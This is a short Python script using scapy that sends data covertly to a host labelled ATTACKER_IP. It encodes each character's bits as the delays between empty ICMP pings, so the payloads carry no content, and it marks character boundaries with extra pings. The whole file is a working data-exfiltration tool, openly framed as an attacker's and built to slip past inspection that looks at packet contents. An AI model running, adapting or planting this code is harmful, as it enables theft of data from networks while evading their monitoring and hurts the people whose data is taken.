import time
from scapy.all import IP, ICMP, send, conf

# --- CONFIGURATION ---
ATTACKER_IP = "10.0.0.5"
conf.verb = 0  # Silent mode

# --- TIMING PROTOCOL (The Secret Code) ---
DOT_DELAY  = 0.1  # Represents Binary '0'
DASH_DELAY = 0.3  # Represents Binary '1'
CHAR_GAP   = 0.6  # Represents "End of Character"

def send_data_over_icmp(data):
    print(f"[>] Exfiltrating via ICMP Timing: '{data}'")
    
    for char in data:
        # 1. Convert char to 8-bit binary (e.g., 'A' -> '01000001')
        binary_string = format(ord(char), '08b')
        print(f"    Sending '{char}' as {binary_string}...")

        for bit in binary_string:
            # 2. Decide how long to wait based on the bit
            if bit == '0':
                time.sleep(DOT_DELAY)
            else:
                time.sleep(DASH_DELAY)
            
            # 3. Send an Empty Ping
            packet = IP(dst=ATTACKER_IP)/ICMP()
            send(packet)
        
        # 4. Wait longer to signal "End of Character"
        time.sleep(CHAR_GAP)
        # Send a delimiting packet to mark the end
        send(IP(dst=ATTACKER_IP)/ICMP())

    print("[✓] ICMP Exfiltration Complete.")
